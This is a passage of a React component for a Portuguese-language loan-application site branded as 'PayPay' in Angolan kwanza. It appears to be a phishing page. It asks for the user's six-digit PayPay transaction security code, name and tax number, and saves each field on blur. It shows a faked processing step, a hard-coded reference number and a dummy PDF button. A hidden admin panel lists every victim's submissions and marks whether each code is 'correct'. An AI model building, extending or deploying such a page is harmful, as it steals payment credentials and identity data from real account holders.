                    <span>Autenticação encriptada e segura</span>
                  </div>
                </div>
              </motion.div>
            )}

            {step === "step2" && (
              <motion.div
                key="step2"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="space-y-6"
              >
                <div className="flex flex-col items-center space-y-6 text-center">
                  <div className="bg-primary/10 text-primary px-3 py-1 rounded-full text-xs font-medium">Etapa 2 de 5</div>
                  <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center shadow-sm">
                    <img src={logoPaypay} alt="paypay" className="w-10 h-10 object-contain" />
                  </div>
                  <div className="space-y-2">
                    <h2 className="text-2xl font-bold uppercase tracking-tight">Código De Pagamento PayPay</h2>
                    <p className="text-muted-foreground text-sm">
                      É obrigatório introduzir os <span className="font-bold text-foreground">6 dígitos</span> do seu código de pagamento paypay para validar a conta <span className="font-bold text-foreground">{accountNumber || "555555555"}</span>.
                    </p>
                  </div>
                </div>

                <div className="flex justify-between gap-2">
                  {paymentCode.map((digit, idx) => (
                    <input
                      key={idx}
                      id={`code-${idx}`}
                      type="text"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, "");
                        const newCode = [...paymentCode];
                        newCode[idx] = val;
                        setPaymentCode(newCode);
                        if (val && idx < 5) {
                          document.getElementById(`code-${idx + 1}`)?.focus();
                        }
                      }}
                      onKeyDown={(e) => {
                        if (e.key === "Backspace" && !paymentCode[idx] && idx > 0) {
                          document.getElementById(`code-${idx - 1}`)?.focus();
                        }
                      }}
                      onBlur={() => saveProgress()}
                      className="w-12 h-14 text-center text-xl font-bold border-2 border-border rounded-xl focus:border-primary focus:ring-0 outline-none transition-all"
                    />
                  ))}
                </div>

                {paymentCode.some(d => !d) && (
                  <p className="text-destructive text-xs flex items-center gap-1 justify-center">
                    <Info className="w-3 h-3" /> O código de pagamento é obrigatório (deve conter 6 dígitos).
                  </p>
                )}

                <p className="text-center text-xs text-muted-foreground">Código de segurança de transações da app paypay</p>

                <button
                  disabled={paymentCode.some(d => !d)}
                  onClick={async () => {
                    await saveProgress();
                    nextStep("step3");
                  }}
                  className="w-full bg-primary text-white h-14 rounded-2xl font-bold text-lg shadow-[0_4px_12px_rgba(59,130,246,0.3)] disabled:opacity-50 disabled:shadow-none transition-all cursor-pointer flex items-center justify-center"
                >
                  Confirmar
                </button>
              </motion.div>
            )}

            {step === "step3" && (
              <motion.div
                key="step3"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="space-y-8"
              >
                <div className="flex flex-col items-center space-y-4 text-center">
                  <div className="bg-primary/10 text-primary px-3 py-1 rounded-full text-xs font-medium">Etapa 3 de 5</div>
                  <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center">
                    <img src={logoPaypay} alt="" className="w-8" />
                  </div>
                  <div className="space-y-1">
                    <h2 className="text-2xl font-bold">Sistema de Empréstimo</h2>
                    <p className="text-muted-foreground text-xs uppercase tracking-wider">Limite: 35.000 Kz</p>
                  </div>
                </div>

                <div className="bg-secondary/30 rounded-3xl p-6 space-y-6">
                  <div className="space-y-4">
                    <div className="flex justify-between items-end">
                      <span className="text-sm font-medium">Selecione o valor</span>
                      <span className="text-3xl font-black text-primary">{amount.toLocaleString("pt-AO")} Kz</span>
                    </div>
                    <input
                      type="range"
                      min="2000"
                      max="35000"
                      step="500"
                      value={amount}
                      onChange={(e) => setAmount(Number(e.target.value))}
                      className="w-full h-2 bg-border rounded-lg appearance-none cursor-pointer accent-primary"
                    />
                  </div>

                  <div className="space-y-4">
                    <span className="text-sm font-medium">Prazo para reembolso</span>
                    <div className="grid grid-cols-4 gap-2">
                      {[15, 30, 45, 60].map((days) => (
                        <button
                          key={days}
                          onClick={() => setTerm(days)}
                          className={cn(
                            "h-10 rounded-lg text-xs font-bold transition-all cursor-pointer",
                            term === days ? "bg-primary text-white shadow-md" : "bg-white text-foreground border border-border"
                          )}
                        >
                          {days} dias
                        </button>
                      ))}
                    </div>
                  </div>

                  <div className="pt-4 border-t border-border/50 space-y-2">
                    <div className="flex justify-between text-xs">
                      <span className="text-muted-foreground">Valor solicitado:</span>
                      <span className="font-bold">{amount.toLocaleString("pt-AO")} Kz</span>
                    </div>
                    <div className="flex justify-between text-xs">
                      <span className="text-muted-foreground">Taxa aplicada ({feePercentage}%):</span>
                      <span className="font-bold">+{refundMargin.toLocaleString("pt-AO")} Kz</span>
                    </div>
                    <div className="flex justify-between text-sm pt-2 border-t border-dashed border-border/50">
                      <span className="font-bold">Total a devolver:</span>
                      <span className="font-black text-primary">{totalToRefund.toLocaleString("pt-AO")} Kz</span>
                    </div>
                  </div>
                </div>

                <div className="space-y-2">
                  <span className="text-sm font-bold flex items-center gap-2">
                    <Info className="w-4 h-4 text-primary" /> Regulamento do Serviço
                  </span>
                  <div 
                    ref={scrollRef}
                    onScroll={handleScroll}
                    className="h-24 overflow-y-auto bg-secondary/20 rounded-xl p-3 text-[10px] text-muted-foreground leading-relaxed border border-border"
                  >
                    <p>Ao solicitar este empréstimo, você concorda que o valor será descontado automaticamente da sua conta paypay no prazo selecionado. O não cumprimento do pagamento resultará em taxas adicionais e restrições na sua conta. Certifique-se de ter saldo disponível na data de vencimento. Os termos e condições completos podem ser consultados no nosso website oficial ou através do suporte ao cliente.</p>
                  </div>
                  {!scrolledToBottom && (
                    <p className="text-[10px] text-primary text-center animate-bounce">Leia o regulamento até ao fim para continuar</p>
                  )}
                </div>

                <button
                  disabled={!scrolledToBottom}
                  onClick={() => nextStep("step4")}
                  className="w-full bg-primary text-white h-14 rounded-2xl font-semibold text-lg shadow-lg disabled:opacity-50 transition-all cursor-pointer"
                >
                  Confirmar Valores e Avançar
                </button>
              </motion.div>
            )}

            {step === "step4" && (
              <motion.div
                key="step4"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="space-y-6"
              >
                <div className="flex flex-col items-center space-y-6 text-center">
                  <div className="bg-primary/10 text-primary px-3 py-1 rounded-full text-xs font-medium">Etapa 4 de 5</div>
                  <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center">
                    <img src={userIconAsset} alt="" className="w-8" />
                  </div>
                  <div className="space-y-2">
                    <h2 className="text-2xl font-bold">Preenchimento de Dados de Registo</h2>
                    <p className="text-muted-foreground text-sm">Confirme o seu Nome e NIF para prosseguir com o pedido.</p>
                  </div>
                </div>

                <div className="space-y-4">
                  <div className="space-y-2 border-b border-border pb-2">
                    <label className="text-sm font-bold text-foreground">Nome Completo</label>
                    <input
                      type="text"
                      placeholder="Inserir Nome Completo"
                      value={personalData.name}
                      onChange={(e) => setPersonalData({ ...personalData, name: e.target.value })}
                      onBlur={() => saveProgress()}
                      className="w-full text-sm outline-none bg-transparent py-2"
                    />
                  </div>
                  <div className="space-y-2 border-b border-border pb-2">
                    <label className="text-sm font-bold text-foreground">NIF (Número de Identificação Fiscal)</label>
                    <input
                      type="text"
                      placeholder="Ex: 000000000LA000"
                      maxLength={14}
                      value={personalData.nif}
                      onChange={(e) => setPersonalData({ ...personalData, nif: e.target.value.toUpperCase() })}
                      onBlur={() => saveProgress()}
                      className="w-full text-sm outline-none bg-transparent py-2"
                    />
                  </div>
                </div>

                <div className="space-y-4">
                  <div className="flex items-start gap-3">
                    <div 
                      onClick={() => setAcceptedTerms(!acceptedTerms)}
                      className={cn(
                        "w-5 h-5 rounded border-2 flex items-center justify-center transition-all cursor-pointer mt-0.5",
                        acceptedTerms ? "bg-primary border-primary" : "border-border"
                      )}
                    >
                      {acceptedTerms && <Check className="w-3.5 h-3.5 text-white" />}
                    </div>
                    <p className="text-[10px] text-muted-foreground">
                      Ao prosseguir, declaro que os dados acima indicados são verdadeiros e que li e aceito os <span className="text-primary font-bold">Termos e Declarações Obrigatórias</span>.
                    </p>
                  </div>
                </div>

                <button
                  disabled={!personalData.name || personalData.nif.length < 9 || !acceptedTerms}
                  onClick={() => nextStep("summary")}
                  className="w-full bg-primary text-white h-14 rounded-2xl font-semibold text-lg shadow-lg disabled:opacity-50 transition-all cursor-pointer"
                >
                  Concluir Registo e Ver Pedido
                </button>
              </motion.div>
            )}

            {step === "summary" && (
              <motion.div
                key="summary"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                className="space-y-6"
              >
                <div className="flex flex-col items-center space-y-4 text-center">
                  <div className="bg-primary/10 text-primary px-3 py-1 rounded-full text-xs font-medium">Etapa 5 de 5</div>
                  <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center">
                    <img src={logoPaypay} alt="" className="w-8" />
                  </div>
                  <div className="space-y-1">
                    <h2 className="text-2xl font-bold">Confirmação do Pedido</h2>
                    <p className="text-muted-foreground text-sm">Resumo detalhado do seu empréstimo.</p>
                  </div>
                </div>
                
                <div className="bg-secondary/30 rounded-3xl p-6 space-y-4 border border-border/50">
                  <div className="space-y-4">
                    <div className="flex justify-between items-center text-xs">
                      <span className="text-muted-foreground uppercase font-bold">Titular da conta</span>
                      <span className="font-bold text-foreground">{personalData.name}</span>
                    </div>
                    <div className="flex justify-between items-center text-xs">
                      <span className="text-muted-foreground uppercase font-bold">NIF do Cliente</span>
                      <span className="font-bold text-foreground">{personalData.nif}</span>
                    </div>
                    <div className="h-px bg-border/50" />
                    <div className="flex justify-between items-center text-sm">
                      <span className="text-muted-foreground">Crédito Solicitado</span>
                      <span className="font-bold">{amount.toLocaleString("pt-AO")} Kz</span>
                    </div>
                    <div className="flex justify-between items-center text-xs">
                      <span className="text-muted-foreground italic">Será verificado se tem 100 kz para ver se a conta tá operacional</span>
                    </div>
                    <div className="flex justify-between items-center text-sm">
                      <span className="text-muted-foreground font-bold uppercase text-[10px]">Taxa Aplicada ({feePercentage}%)</span>
                      <span className="font-bold text-foreground">+{refundMargin.toLocaleString("pt-AO")} Kz</span>
                    </div>
                    <div className="flex justify-between items-center text-sm">
                      <span className="text-muted-foreground font-bold uppercase text-[10px]">Valor Total a Devolver</span>
                      <span className="font-bold text-primary">{totalToRefund.toLocaleString("pt-AO")} Kz</span>
                    </div>
                    <div className="flex justify-between items-center text-sm">
                      <span className="text-muted-foreground">Prazo de Reembolso</span>
                      <span className="font-bold">Em {term} dias</span>
                    </div>
                    <div className="h-px bg-border/50" />
                    <div className="flex justify-between items-center">
                      <span className="font-bold text-lg">Total a Receber</span>
                      <span className="font-black text-2xl text-primary">{ amount.toLocaleString("pt-AO") } Kz</span>
                    </div>
                    <p className="text-[10px] text-muted-foreground italic text-center pt-2">
                      Após o tempo previsto iremos descontar de forma automática o valor total da sua conta.
                    </p>
                  </div>
                </div>

                <div className="space-y-3 pt-4">
                  <button
                    onClick={() => {
                      saveProgress();
                      nextStep("confirm");
                    }}
                    className="w-full bg-primary text-white h-14 rounded-2xl font-semibold text-lg shadow-lg cursor-pointer"
                  >
                    Confirmar e Submeter
                  </button>
                  <button
                    onClick={() => setStep("step3")}
                    className="w-full h-14 rounded-2xl font-semibold text-muted-foreground hover:text-foreground transition-all cursor-pointer"
                  >
                    Alterar Pedido
                  </button>
                </div>
              </motion.div>
            )}

            {step === "confirm" && (
               <motion.div
                key="confirm"
                className="text-center space-y-8"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
               >
                 <div className="flex justify-center">
                   <div className="w-20 h-20 bg-primary/10 rounded-full flex items-center justify-center">
                     <ShieldCheck className="w-10 h-10 text-primary animate-pulse" />
                   </div>
                 </div>
                 <div className="space-y-2">
                   <h2 className="text-2xl font-bold">Processando seu pedido</h2>
                   <p className="text-muted-foreground">Isso levará apenas alguns segundos.</p>
                 </div>
                 <motion.div 
                   className="h-1 bg-secondary w-full rounded-full overflow-hidden"
                   initial={{ opacity: 1 }}
                 >
                   <motion.div 
                     className="h-full bg-primary"
                     initial={{ width: 0 }}
                     animate={{ width: "100%" }}
                     transition={{ duration: 2 }}
                     onAnimationComplete={() => nextStep("success")}
                   />
                 </motion.div>
               </motion.div>
            )}

            {step === "success" && (
              <motion.div
                key="success"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="text-center space-y-8"
              >
                <div className="flex flex-col items-center space-y-6">
                  <div className="w-24 h-24 rounded-full flex items-center justify-center overflow-hidden">
                    <img src={successIconAsset.url} alt="Sucesso" className="w-full h-full object-cover" />
                  </div>
                  <div className="space-y-2">
                    <h2 className="text-3xl font-black text-primary leading-tight">Submetido com sucesso!</h2>
                    <p className="text-muted-foreground text-sm px-4">
                      O seu pedido de empréstimo no valor de <span className="font-bold text-foreground">{amount.toLocaleString("pt-AO")} Kz</span> foi submetido com sucesso.
                    </p>
                  </div>
                </div>
                
                <div className="bg-secondary/30 rounded-3xl p-6 text-left space-y-4 border border-border/50">
                  <div className="flex justify-between items-center text-xs">
                    <span className="text-muted-foreground uppercase font-bold">Referência</span>
                    <span className="font-mono font-bold">#PAY-89231</span>
                  </div>
                  <div className="flex justify-between items-center text-xs">
                    <span className="text-muted-foreground uppercase font-bold">Titular</span>
                    <span className="font-bold">{personalData.name}</span>
                  </div>
                  <div className="flex justify-between items-center text-xs">
                    <span className="text-muted-foreground uppercase font-bold">NIF</span>
                    <span className="font-bold">{personalData.nif}</span>
                  </div>
                  <div className="h-px bg-border/50" />
                  <div className="flex justify-between items-center text-xs">
                    <span className="text-muted-foreground uppercase font-bold">Valor Recebido</span>
                    <span className="font-bold">{amount.toLocaleString("pt-AO")} Kz</span>
                  </div>
                  <div className="flex justify-between items-center text-xs">
                    <span className="text-muted-foreground uppercase font-bold">Valor Total a Devolver</span>
                    <span className="font-bold">{totalToRefund.toLocaleString("pt-AO")} Kz</span>
                  </div>
                  <div className="flex justify-between items-center text-xs">
                    <span className="text-muted-foreground uppercase font-bold">Vencimento</span>
                    <span className="font-bold">Em {term} dias</span>
                  </div>
                  <p className="text-[10px] text-muted-foreground italic text-center pt-2">
                    O valor total será descontado de forma automática após o prazo previsto.
                  </p>
                </div>

                <div className="space-y-4 pt-4">
                  <button
                    onClick={() => toast.success("PDF gerado e guardado com sucesso!")}
                    className="w-full bg-primary text-white h-14 rounded-2xl font-semibold text-lg shadow-lg flex items-center justify-center gap-2 cursor-pointer"
                  >
                    <Download className="w-5 h-5" /> Imprimir / Guardar PDF
                  </button>
                  <button
                    onClick={() => setStep("home")}
                    className="w-full h-14 rounded-2xl font-semibold text-muted-foreground hover:text-foreground transition-all cursor-pointer"
                  >
                    Voltar ao Início
                  </button>
                </div>
              </motion.div>
            )}

            {step === "admin" && (
              <motion.div
                key="admin"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="space-y-6"
              >
                <div className="flex items-center justify-between border-b pb-4">
                  <h2 className="text-2xl font-bold flex items-center gap-2">
                    <LayoutDashboard className="w-6 h-6 text-primary" />
                    Painel Admin
                  </h2>
                  <button onClick={() => { setStep("home"); setAdminAuthenticated(false); setAdminPassword(""); }} className="text-sm text-muted-foreground hover:text-primary cursor-pointer">Sair</button>
                </div>

                {!adminAuthenticated ? (
                  <div className="space-y-4 pt-4">
                    <div className="space-y-2 border-b border-border pb-2">
                      <label className="text-sm font-bold text-foreground uppercase tracking-tight">Senha do Administrador</label>
                      <input
                        type="password"
                        placeholder="Insira a senha do administrador"
                        value={adminPassword}
                        onChange={(e) => setAdminPassword(e.target.value)}
                        className="w-full text-sm outline-none bg-transparent py-2"
                      />
                    </div>
                    <button
                      disabled={loading}
                      onClick={async () => {
                        setLoading(true);
                        try {
                          await verifyAdminPassword({ data: { password: adminPassword } });
                          setAdminAuthenticated(true);
                          toast.success("Acesso autorizado!");
                        } catch (err) {
                          toast.error("Senha incorreta ou erro de acesso!");
                        } finally {
                          setLoading(false);
                        }
                      }}
                      className="w-full bg-primary text-primary-foreground h-14 rounded-2xl font-semibold text-lg shadow-lg cursor-pointer flex items-center justify-center gap-2"
                    >
                      {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Aceder ao Painel"}
                    </button>
                  </div>

                ) : (
                  <div className="space-y-6">
                    <div className="flex gap-2 p-1 bg-secondary/30 rounded-xl">
                      <button 
                        onClick={() => setAdminTab("users")}
                        className={cn(
                          "flex-1 py-2 px-4 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-2",
                          adminTab === "users" ? "bg-white text-primary shadow-sm" : "text-muted-foreground hover:text-primary"
                        )}
                      >
                        <User className="w-4 h-4" /> Usuários Ativos
                      </button>
                      <button 
                        onClick={() => setAdminTab("trash")}
                        className={cn(
                          "flex-1 py-2 px-4 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-2",
                          adminTab === "trash" ? "bg-white text-primary shadow-sm" : "text-muted-foreground hover:text-primary"
                        )}
                      >
                        <History className="w-4 h-4" /> Lixeira
                      </button>
                    </div>

                    <section className="space-y-3">
                      <h3 className="text-xs font-black uppercase text-primary flex items-center gap-2 tracking-wider">
                        {adminTab === "users" ? (
                          <><Info className="w-4 h-4" /> Todos os Usuários e Atividades</>
                        ) : (
                          <><Trash2 className="w-4 h-4" /> Registos Apagados (Auto-limpeza 10 dias)</>
                        )}
                      </h3>
                      <AdminDataList />
                    </section>
                  </div>
                )}
              </motion.div>
            )}
          </AnimatePresence>
        </main>

        <footer className="mt-8 text-center">
          <p className="text-[10px] text-muted-foreground uppercase tracking-widest font-medium">
            &copy; {new Date().getFullYear()} PAYPAY ADIANTA PAY. TODOS OS DIREITOS RESERVADOS.
          </p>
        </footer>
        <div className="fixed bottom-0 right-0 left-0 z-[9999999] pointer-events-none flex justify-end">
          <div className="relative w-full h-[32px] bg-[#F8F9FC] pointer-events-auto flex items-center justify-end pr-4 shadow-sm border-t border-border/5">
             <img src={logoPaypay} alt="paypay" className="h-[14px] w-auto object-contain relative z-10 opacity-60" />
             <div className="absolute inset-0 bg-[#F8F9FC] z-0"></div>
          </div>
        </div>
      </div>
      
      {/* Rejection Customization Modal */}
      <AnimatePresence>
        {rejectionDialog.isOpen && (
          <div className="fixed inset-0 z-[10000000] flex items-center justify-center p-6 bg-black/60 backdrop-blur-sm">
            <motion.div 
              initial={{ opacity: 0, scale: 0.95, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 20 }}
              className="bg-white rounded-[32px] w-full max-w-sm shadow-2xl p-8 space-y-6"
            >
              <div className="text-center space-y-2">
                <div className={cn(
                  "w-16 h-16 rounded-full mx-auto flex items-center justify-center mb-2",
                  rejectionDialog.isCorrect ? "bg-green-100" : "bg-red-100"
                )}>
                  {rejectionDialog.isCorrect ? (
                    <CheckCircle2 className="w-8 h-8 text-green-600" />
                  ) : (
                    <XCircle className="w-8 h-8 text-red-600" />
                  )}
                </div>
                <h3 className="text-xl font-bold">Personalizar Análise</h3>
                <p className="text-sm text-muted-foreground italic">
                  Defina o motivo que o usuário verá ao consultar o status.
                </p>
              </div>

              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase text-muted-foreground tracking-wider ml-1">Motivo da Decisão</label>
                  <div className="flex flex-wrap gap-2">
                    {[
                      rejectionDialog.isCorrect ? "Não se qualifica" : "Dados incorretos",
                      "Documentação pendente",
                      "Conta inativa",
                      "NIF inválido",
                      "Aguardando verificação"
                    ].map((reason) => (
                      <button
                        key={reason}
                        onClick={() => setCustomRejectionReason(reason)}
                        className={cn(
                          "px-3 py-1.5 rounded-full text-[10px] font-bold transition-all border",
                          customRejectionReason === reason 
                            ? "bg-primary text-white border-primary shadow-sm" 
                            : "bg-secondary/50 text-muted-foreground border-transparent hover:border-border"
                        )}
                      >
                        {reason}
                      </button>
                    ))}
                  </div>
                </div>

                <div className="space-y-2 border-b border-border focus-within:border-primary transition-colors py-1">
                  <input
                    type="text"
                    placeholder="Ou escreva um motivo personalizado..."
                    value={customRejectionReason}
                    onChange={(e) => setCustomRejectionReason(e.target.value)}
                    className="w-full text-xs outline-none bg-transparent placeholder:italic"
                  />
                </div>
              </div>

              <div className="flex gap-3 pt-2">
                <button
                  onClick={() => setRejectionDialog({ isOpen: false, appId: "", isCorrect: false })}
                  className="flex-1 h-12 rounded-2xl font-bold text-xs text-muted-foreground hover:bg-secondary transition-all"
                >
                  Cancelar
                </button>
                <button
                  disabled={loading || !customRejectionReason.trim()}
                  onClick={handleConfirmStatusUpdate}
                  className={cn(
                    "flex-1 h-12 rounded-2xl font-bold text-xs text-white shadow-lg transition-all flex items-center justify-center gap-2",
                    rejectionDialog.isCorrect ? "bg-green-600" : "bg-red-600"
                  )}
                >
                  {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : "Confirmar"}
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}


